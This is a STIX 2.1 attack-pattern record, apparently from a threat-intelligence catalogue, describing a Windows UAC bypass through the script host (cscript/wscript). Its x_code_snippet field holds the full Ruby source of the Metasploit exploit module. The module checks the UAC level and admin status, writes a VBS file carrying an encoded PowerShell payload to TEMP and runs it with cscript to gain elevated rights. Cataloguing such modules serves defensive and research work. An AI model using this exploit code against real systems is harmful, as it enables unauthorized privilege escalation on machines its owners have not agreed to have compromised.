{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--131e564c-92bf-4e1c-bfb5-db0205a5872e",
    "created": "2024-08-14T16:49:52.291326Z",
    "modified": "2024-08-14T16:49:52.29133Z",
    "name": "Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)",
    "description": " This module will bypass Windows UAC by utilizing the missing .manifest on the script host cscript/wscript.exe binaries.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/bypassuac_vbs.rb",
            "external_id": "bypassuac_vbs.rb"
        },
        {
            "source_name": "reference",
            "url": "http://seclist.us/uac-bypass-vulnerability-in-the-windows-script-host.html"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/Vozzie/uacscript"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Exploit::FileDropper\n  include Exploit::Powershell\n  include Post::File\n  include Post::Windows::Priv\n  include Post::Windows::Runas\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)',\n        'Description' => %q{\n          This module will bypass Windows UAC by utilizing the missing .manifest on the script host\n          cscript/wscript.exe binaries.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Vozzie',\n          'Ben Campbell'\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Targets' => [\n          [ 'Automatic', { 'Arch' => [ ARCH_X86, ARCH_X64 ] } ]\n        ],\n        'DefaultTarget' => 0,\n        'References' => [\n          ['URL', 'http://seclist.us/uac-bypass-vulnerability-in-the-windows-script-host.html'],\n          ['URL', 'https://github.com/Vozzie/uacscript']\n        ],\n        'DisclosureDate' => '2015-08-22'\n      )\n    )\n  end\n\n  def exploit\n    # Validate that we can actually do things before we bother\n    # doing any more work\n    validate_environment!\n    check_permissions!\n\n    # get all required environment variables in one shot instead. This\n    # is a better approach because we don't constantly make calls through\n    # the session to get the variables.\n    env_vars = get_envs('TEMP', 'WINDIR')\n\n    case get_uac_level\n    when UAC_PROMPT_CREDS_IF_SECURE_DESKTOP,\n        UAC_PROMPT_CONSENT_IF_SECURE_DESKTOP,\n        UAC_PROMPT_CREDS, UAC_PROMPT_CONSENT\n      fail_with(Failure::NotVulnerable,\n                \"UAC is set to 'Always Notify'. This module does not bypass this setting, exiting...\")\n    when UAC_DEFAULT\n      print_good('UAC is set to Default')\n      print_good('BypassUAC can bypass this setting, continuing...')\n    when UAC_NO_PROMPT\n      print_warning('UAC set to DoNotPrompt - using ShellExecute \"runas\" method instead')\n      shell_execute_exe\n      return\n    end\n\n    vbs_filepath = \"#{env_vars['TEMP']}\\\\#{rand_text_alpha(8)}.vbs\"\n\n    upload_vbs(vbs_filepath)\n\n    cmd_exec(\"cscript.exe //B #{vbs_filepath}\")\n  end\n\n  def check_permissions!\n    # Check if you are an admin\n    vprint_status('Checking admin status...')\n    admin_group = is_in_admin_group?\n\n    if admin_group.nil?\n      print_error('Either whoami is not there or failed to execute')\n      print_error('Continuing under assumption you already checked...')\n    elsif admin_group\n      print_good('Part of Administrators group! Continuing...')\n    else\n      fail_with(Failure::NoAccess, 'Not in admins group, cannot escalate with this module')\n    end\n\n    if get_integrity_level == INTEGRITY_LEVEL_SID[:low]\n      fail_with(Failure::NoAccess, 'Cannot BypassUAC from Low Integrity Level')\n    end\n  end\n\n  def upload_vbs(payload_filepath)\n    vbs = File.read(File.join(Msf::Config.data_directory,\n                              'exploits',\n                              'scripthost_uac_bypass',\n                              'bypass.vbs'))\n\n    command = cmd_psh_payload(payload.encoded, payload_instance.arch.first, remove_comspec: true)\n\n    vbs.gsub!('COMMAND', command)\n    print_status('Uploading the Payload VBS to the filesystem...')\n    begin\n      vprint_status(\"Payload VBS #{vbs.length} bytes long being uploaded..\")\n      write_file(payload_filepath, vbs)\n      register_file_for_cleanup(payload_filepath)\n    rescue Rex::Post::Meterpreter::RequestError => e\n      fail_with(Failure::Unknown, \"Error uploading file #{payload_filepath}: #{e.class} #{e}\")\n    end\n  end\n\n  def validate_environment!\n    fail_with(Failure::None, 'Already in elevated state') if is_admin? || is_system?\n\n    version = get_version_info\n    if version.win7_or_2008r2?\n      print_good(\"#{version.product_name} may be vulnerable.\")\n    else\n      fail_with(Failure::NotVulnerable, \"#{version.product_name} is not vulnerable.\")\n    end\n\n    if is_uac_enabled?\n      print_status('UAC is Enabled, checking level...')\n    else\n      unless is_in_admin_group?\n        fail_with(Failure::NoAccess, 'Not in admins group, cannot escalate with this module')\n      end\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-08-22",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}